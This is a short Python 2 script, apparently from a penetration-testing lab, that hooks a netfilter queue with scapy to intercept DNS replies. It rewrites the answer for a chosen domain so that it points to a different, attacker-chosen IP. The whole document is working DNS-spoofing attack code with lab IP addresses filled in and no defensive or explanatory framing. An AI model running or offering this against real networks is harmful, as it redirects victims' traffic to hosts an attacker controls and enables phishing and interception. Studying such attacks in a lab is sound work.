#!/usr/bin/env python2
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP

target_ip_vm = "192.168.63.174"
target_interface_vm = "Ethernet0"
new_target_ip = "192.168.63.139"
target_DN = "www.pentest-standard.org"
# 44.238.29.244
# pentest-standard.org
# 96.126.116.56

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[DNSQR].qname
        if target_DN in qname:
            print("[+] Spoofing Target: " + target_DN)
            answer = DNSRR(rrname=qname, rdata=new_target_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            # del scapy_packet[DNS].rdlen
            # del scapy_packet[DNS].ttl
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            del scapy_packet[IP].chksum
            # print(scapy_packet.show()) Works up to this point
            packet.set_payload(str(scapy_packet))
    packet.accept()

nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
